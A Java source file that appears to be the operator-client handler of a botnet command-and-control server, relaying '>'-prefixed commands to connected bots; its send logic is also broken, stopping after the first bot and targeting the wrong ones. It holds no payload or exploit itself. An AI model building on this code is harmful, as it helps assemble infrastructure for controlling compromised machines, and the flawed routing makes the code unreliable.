package xyz.terrific.server.client.cnc;

import xyz.terrific.server.bot.cnc.BotHandler;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.ArrayList;

public class ClientHandler implements Runnable {
    public static ArrayList<ClientHandler> handlers = new ArrayList<>();

    private String          name;
    private Socket          socket;
    private BufferedReader  reader;
    public BufferedWriter   writer;


    public ClientHandler(Socket socket) {
        try {

            this.socket     = socket;
            this.writer     = new BufferedWriter(new OutputStreamWriter(    this.socket.getOutputStream()   ));
            this.reader     = new BufferedReader(new InputStreamReader(     this.socket.getInputStream()    ));
            this.name       = this.reader.readLine();
            handlers.add(this);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {

        while (this.socket.isConnected()) {
            try {
                String message = this.reader.readLine();
                System.out.printf(" [ CLIENT | %s ]  %s\n", this.name, message);

                if (message.startsWith("> ")) {
                    sendAll(message);
                }
                else if (message.startsWith(">> ")) {
                    send(message.split(" ")[1], message);
                }

            } catch (Exception e) {
                close(this.socket, this.reader, this.writer);
                e.printStackTrace();
                return;
            }
        }

    }

    public static void send(String botName, String command) {
        for (BotHandler handler : BotHandler.handlers) {
            try {

                if (!handler.name.equals(botName)) {
                    handler.writer.write(command);
                    handler.writer.newLine();
                    handler.writer.flush();
                }

                break;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void sendAll(String command) {
        for (BotHandler handler : BotHandler.handlers) {
            try {

                if (!handler.name.equals(this.name)) {
                    handler.writer.write(command);
                    handler.writer.newLine();
                    handler.writer.flush();
                }

                break;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void removeHandler() {
        handlers.remove(this);
        System.out.printf(" [ CLIENT | %s ]  Closed Connection\n", this.name);
    }

    public void close(Socket socket, BufferedReader reader, BufferedWriter writer) {
        removeHandler();
        try {
            if (reader != null) reader.close();
            if (writer != null) writer.close();
            if (socket != null) socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
